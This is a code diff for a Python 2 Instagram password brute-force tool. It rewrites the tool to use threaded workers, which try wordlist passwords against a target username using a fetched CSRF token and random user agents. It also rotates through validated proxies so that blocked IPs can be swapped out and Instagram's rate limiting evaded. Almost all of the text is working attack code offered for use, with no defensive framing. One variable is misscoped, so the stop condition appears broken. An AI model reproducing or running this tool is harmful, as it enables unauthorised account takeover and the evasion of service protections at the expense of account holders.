@@ -6,23 +6,21 @@
 # !/usr/bin/python
 ###############################################################################
 
-import sys
-import requests as rq
+import Queue
 import random
-import multiprocessing
-import time
+import sys
+import threading
+
+import requests as rq
 
 
-def check_avalaible_proxys(proxys):
+def check_proxy(q):
     """
-    check proxy lists for getting avalaible proxy's
+    check proxy for and append to working proxies
+    :param proxy:
     """
-    # TODO: make proxy test function faster
-
-    global proxys_working_list
-    print "\n[-] Testing Proxy List..."
-    proxys_working_list = {}
-    for proxy in proxys:
+    if not q.empty():
+        proxy = q.get(False)
         proxy = proxy.replace("\r", "").replace("\n", "")
         try:
             r = rq.get("https://api.ipify.org/", proxies={'https': 'https://' + proxy}, timeout=5)
@@ -30,10 +28,13 @@ def check_avalaible_proxys(proxys):
                 proxy_ip, sp, port = proxy.rpartition(':')
                 if proxy_ip == r.text:
                     proxys_working_list.update({proxy: proxy})
-                    print " --[+] ", proxy
+                    print " --[+] ", proxy, " | PASS"
+                else:
+                    print " --[!] ", proxy, " | FAILED"
+            else:
+                print " --[!] ", proxy, " | FAILED"
         except rq.exceptions.RequestException:
             pass
-    print "[+] Online Proxy: ", len(proxys_working_list)
 
 
 def get_csrf():
@@ -49,88 +50,143 @@ def get_csrf():
     print "[+] CSRF Token :", csrf_token, "\n"
 
 
-def brute(word, event):
+def brute(q):
     """
     main worker function
     :param word:
     :param event:
     :return:
     """
-    global proxy_string
-    try:
-        proxy = None
-        if len(proxys_working_list) != 0:
-            proxy = random.choice(proxys_working_list)
-            proxy_string = {'https': 'https://' + proxy + '/'}
+    if not q.empty():
+        global proxy_string
+        try:
+            proxy = None
+            if len(proxys_working_list) != 0:
+                proxy = random.choice(proxys_working_list.keys())
+                proxy_string = {'https': 'https://' + proxy}
 
-        word = word.replace("\r", "").replace("\n", "")
-        post_data = {
-            'username': USER,
-            'password': word,
-        }
-        header = {
-            "User-Agent": random.choice(user_agents),
-            'X-Instagram-AJAX': 1,
-            "X-CSRFToken": csrf_token,
-            "X-Requested-With": "XMLHttpRequest",
-            "Referer": "https://www.instagram.com/",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
-        }
-        cookies = {
-            "csrftoken": csrf_token
-        }
+            word = q.get()
+            word = word.replace("\r", "").replace("\n", "")
+            post_data = {
+                'username': USER,
+                'password': word,
+            }
+            header = {
+                "User-Agent": random.choice(user_agents),
+                'X-Instagram-AJAX': '1',
+                "X-CSRFToken": csrf_token,
+                "X-Requested-With": "XMLHttpRequest",
+                "Referer": "https://www.instagram.com/",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+            }
+            cookies = {
+                "csrftoken": csrf_token
+            }
 
-        if proxy:
-            print "[*] Trying %s %s " % (word, " | " + proxy,)
-        else:
-            print "[*] Trying %s" % (word,)
-
-        if proxy:
-            r = rq.post(URL, headers=header, data=post_data, cookies=cookies, proxies=proxy_string, timeout=10)
-        else:
-            r = rq.post(URL, headers=header, data=post_data, cookies=cookies, timeout=10)
-
-        if r.status_code != 200:
-            if r.status_code == 400:
-                if proxy:
-                    print "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
-                    proxys_working_list.pop(proxy)
-                else:
-                    print "[!]Error : Your Ip is now on Instagram jail , script will not work fine until you change your ip or use proxy"
+            if proxy:
+                print "[*] Trying %s %s " % (word, " | " + proxy,)
+                r = rq.post(URL, headers=header, data=post_data, cookies=cookies, proxies=proxy_string, timeout=10)
             else:
-                print "Error:", r.status_code
-        else:
-            if r.text.find('{"status":"ok","authenticated":true}') != -1:
-                print "\n[*]Successful Login:"
-                print "---------------------------------------------------"
-                print "[!]Username: ", USER
-                print "[!]Password: ", word
-                print "---------------------------------------------------\n"
-                print "[-] Brute Complete\n"
-                event.set()
-                sys.exit()
+                print "[*] Trying %s" % (word,)
+                r = rq.post(URL, headers=header, data=post_data, cookies=cookies, timeout=10)
 
-    except rq.exceptions.Timeout:
-        print "[!] Time Out ..."
-        pass
-        return
+            if r.status_code != 200:
+                if r.status_code == 400 or r.status_code == 403:
+                    if proxy:
+                        print "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (
+                            proxy,)
+                        proxys_working_list.pop(proxy)
+                        print "\n[+] Online Proxy: ", len(proxys_working_list)
+                    else:
+                        print "[!]Error : Your Ip is now on Instagram jail , script will not work fine until you change your ip or use proxy"
+                else:
+                    print "Error:", r.status_code
+
+                q.task_done()
+                return
+            else:
+                if r.text.find('{"status": "ok", "authenticated": true, "user": "' + USER + '"}') != -1:
+                    print "\n[*]Successful Login:"
+                    print "---------------------------------------------------"
+                    print "[!]Username: ", USER
+                    print "[!]Password: ", word
+                    print "---------------------------------------------------\n"
+                    found_flag = True
+                    q.queue.clear()
+                    q.task_done()
+
+        except Exception as e:
+            print "[!] Error in request"
+            pass
+            return
 
 
 def starter():
     """
-    multiprocessing workers initialize
+    threading workers initialize
     """
+    global found_flag
+
+    queue = Queue.Queue()
+    threads = []
+    max_thread = THREAD
+    found_flag = False
+
+    queuelock = threading.Lock()
+
     print "\n[!] Initializing Workers"
     print "[!] Start Cracking ... \n"
-    p = multiprocessing.Pool(THREAD)
-    m = multiprocessing.Manager()
-    event = m.Event()
 
-    for word in words:
-        p.apply_async(brute, (word, event))
+    try:
+        for word in words:
+            queue.put(word)
+        while not queue.empty():
+            queuelock.acquire()
+            for workers in range(max_thread):
+                t = threading.Thread(target=brute, args=(queue,))
+                t.setDaemon(True)
+                t.start()
+                threads.append(t)
+            for t in threads:
+                t.join()
+            queuelock.release()
+            if found_flag:
+                break
+        print "\n--------------------"
+        print "[!] Brute complete !"
 
-    event.wait()
-    sys.exit()
+    except Exception as err:
+        print err
+
+
+def check_avalaible_proxys(proxys):
+    """
+        check avalaible proxyies from proxy_list file
+    """
+    global proxys_working_list
+    print "\n[-] Testing Proxy List..."
+
+    proxys_working_list = {}
+
+    queue = Queue.Queue()
+    queuelock = threading.Lock()
+    threads = []
+
+    for proxy in proxys:
+        queue.put(proxy)
+
+    while not queue.empty():
+        queuelock.acquire()
+        for workers in range(7):
+            t = threading.Thread(target=check_proxy, args=(queue,))
+            t.setDaemon(True)
+            t.start()
+            threads.append(t)
+        for t in threads:
+            t.join()
+        queuelock.release()
+
+    print "\n[+] Online Proxy: ", len(proxys_working_list)
 
 
 if __name__ == "__main__":
